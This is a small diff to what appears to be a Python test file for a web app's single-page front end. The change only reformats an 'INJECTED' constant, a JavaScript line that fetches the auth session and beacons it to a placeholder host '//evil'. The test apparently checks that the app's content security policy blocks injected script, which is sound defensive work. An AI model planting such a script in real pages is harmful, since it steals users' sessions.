@@ -16,7 +16,9 @@ from shelfhold.interfaces.http_api.spa import mount_spa
 from shelfhold.main import create_app
 
 BOOT = "document.documentElement.dataset.theme='bibliotheque';"
-INJECTED = "fetch('/api/v1/auth/session').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil',t))"
+INJECTED = (
+    "fetch('/api/v1/auth/session').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil',t))"
+)
 ANNOUNCER = "sha256-S8qMpvofolR8Mpjy4kQvEm7m1q8clzU4dfDH0AmvZjo="
 
 
